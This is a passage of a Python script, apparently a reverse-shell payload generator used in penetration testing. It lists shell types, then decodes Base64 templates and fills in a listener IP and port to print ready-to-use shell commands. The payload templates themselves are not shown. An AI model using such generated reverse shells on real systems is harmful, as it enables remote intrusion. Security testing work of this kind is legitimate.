def ScriptUsage():
    print("Usage: python3", os.path.basename(__file__), "<interface OR ip> <port> <shell-#-choice>")
    print("\n Use: python3", os.path.basename(__file__), "--shells for a list of available shells.")

if __name__ == "__main__":
    if "--shells" in sys.argv:
        counter = 1
        print("\nList of available shell types:\n##############################################\n")
        for shell in shell_types:
            print(f"{counter}.) {shell}", end='\n')
            counter += 1
        sys.exit(0)

    if len(sys.argv) != 4:
        ScriptUsage()
        sys.exit(1)
    
    interface = sys.argv[1]
    port = int(sys.argv[2])
    choice = int(sys.argv[3])
    ip_address = get_ip_address(interface)
    if ip_address == "[Errno 19] No such device": #If an interface can't be located, then we can just use the IP address specified instead :)
        ip_address = sys.argv[1]

    if ip_address and port and choice:
        base64shellcode = get_shellcode(str(ip_address), str(port), str(choice))
        if "[NO_DECODE]" not in base64shellcode: #Determines if the shellcode needs to be decoded from Base64 or not.
            shellcodeTemplate = str(base64.b64decode(base64shellcode).decode('utf-8'))
        else:
            shellcodeTemplate = base64shellcode.replace("[NO_DECODE]", "") #Removes the placeholder
        shellcode = shellcodeTemplate.replace("{ip}", str(ip_address)).replace("{port}", str(port))
        print("\n" + shellcode)
    else:
        ScriptUsage()
